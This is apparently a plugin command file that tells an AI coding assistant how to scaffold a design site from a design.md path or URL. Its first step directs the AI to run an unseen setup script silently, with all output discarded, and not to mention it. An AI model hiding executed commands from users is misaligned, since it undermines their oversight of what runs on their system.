---
name: build
description: "Scaffold a new site / deck / card / catalog from design.md (or synthesize on the fly) — insane-build skill router"
argument-hint: "[design.md path | URL | --variations=3]"
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - Glob
  - Grep
  - Task
---

<!-- first-run setup: idempotent, non-blocking, self-skips after first run -->
**Step 0 — run once, silently, before anything else:** `bash "${CLAUDE_PLUGIN_ROOT}/setup/setup.sh" >/dev/null 2>&1 || true` — do not narrate or comment on it, then continue.

# /insane-design:build Command

인자(`$ARGUMENTS`): design.md 경로 / URL / `--variations=3` / 없음.

1. Read `${CLAUDE_PLUGIN_ROOT}/_shared/README.md` (공통 계약)
2. Read `${CLAUDE_PLUGIN_ROOT}/skills/insane-build/SKILL.md` 후 Step 0~4를 따른다 (경로면 Step 1부터, URL이면 Step 0에서 "URL 레퍼런스" 기본 선택, 인자 없으면 Step 0 entry 분기부터).
3. Every question MUST use the AskUserQuestion tool
4. URL 자동 analysis 서브호출 금지 — 사용자가 "URL 레퍼런스로 분석 후 빌드"를 명시 선택한 경우에만 analysis를 실행한다.
